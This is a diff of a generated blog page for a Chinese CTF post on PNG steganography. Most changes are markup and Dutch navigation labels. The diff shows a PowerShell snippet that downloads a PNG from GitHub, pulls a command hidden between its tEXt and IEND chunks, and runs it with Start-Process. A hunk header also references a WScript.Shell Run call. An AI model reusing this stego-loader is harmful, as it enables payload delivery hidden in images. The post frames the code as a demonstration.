-<span class="hljs-variable">$bytes</span> = <span class="hljs-variable">$request</span>.DownloadString(<span class="hljs-variable">$url</span>)
-<span class="hljs-variable">$x</span>=<span class="hljs-variable">$bytes</span>.indexof(<span class="hljs-string">"tEXt"</span>)
-<span class="hljs-variable">$y</span>=<span class="hljs-variable">$bytes</span>.indexof(<span class="hljs-string">"IEND"</span>)
-<span class="hljs-variable">$str</span>=<span class="hljs-variable">$bytes</span>.Substring(<span class="hljs-variable">$x</span>+<span class="hljs-number">4</span>,<span class="hljs-variable">$y</span>-<span class="hljs-variable">$x</span>-<span class="hljs-number">12</span>)
-<span class="hljs-built_in">Start-Process</span> -FilePath <span class="hljs-variable">$str</span>
+<pre><code class="powershell">$url = &#39;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png&#39;
+$request = New-Object System.Net.WebCLient
+$bytes = $request.DownloadString($url)
+$x=$bytes.indexof(&quot;tEXt&quot;)
+$y=$bytes.indexof(&quot;IEND&quot;)
+$str=$bytes.Substring($x+4,$y-$x-12)
+Start-Process -FilePath $str
 </code></pre>
 <p>注:这里给出两种方法，仅作演示</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/10/29/PNG在隐写中的应用/" data-id="cjg9k0mde002v9fbrubqxmzmb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/10/29/PNG在隐写中的应用/" data-id="cjgnci0sn00336vbr1ilyg7yf" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
@@ -674,7 +662,7 @@ newActiveXObject(<span class="hljs-string">"WScript.Shell"</span>).Run(str);
 <nav id="article-nav">
   
     <a href="/2017/10/30/CTF-图像学基础/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
+      <strong class="article-nav-caption">Nieuwer</strong>
       <div class="article-nav-title">
         
           CTF-图像学基础
@@ -684,7 +672,7 @@ newActiveXObject(<span class="hljs-string">"WScript.Shell"</span>).Run(str);
   
   
     <a href="/2017/10/28/CTF-密码学/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
+      <strong class="article-nav-caption">Ouder</strong>
       <div class="article-nav-title">CTF-密码学</div>
     </a>
   
@@ -730,8 +718,8 @@ newActiveXObject(<span class="hljs-string">"WScript.Shell"</span>).Run(str);
     <h2 class="author">Peter pan</h2>
     <h3 class="description">the mark of an educated mind is to be able to entertain a thought without accepting it</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>97</strong><br>文章</div></a>
-      <a href="/categories"><div><strong>89</strong><br>分类</div></a>
+      <a href="/archives"><div><strong>98</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>90</strong><br>分类</div></a>
       <a href="/tags"><div><strong>14</strong><br>标签</div></a>
     </div>
 
